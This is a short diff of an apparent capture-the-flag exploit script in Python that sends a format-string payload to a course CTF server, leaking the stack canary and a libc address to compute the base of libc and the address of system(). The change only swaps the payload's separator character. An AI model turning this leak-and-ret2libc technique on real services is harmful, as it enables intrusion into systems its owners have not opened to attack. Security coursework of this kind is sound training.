@@ -92,9 +92,9 @@ if LOCAL:
 else:
 	p = remote("ctf-fsi.fe.up.pt", 4002)
 
-message1 = sendMessage(p, b"%8$x - %11$x")
+message1 = sendMessage(p, b"%8$x | %11$x")
 
-canary, referenceVal = [int(val,16) for val in message1.split(b'-')]
+canary, referenceVal = [int(val,16) for val in message1.split(b'|')]
 
 libBase = referenceVal - referenceLibOffset
 addressSystem = libBase + systemLibOffset
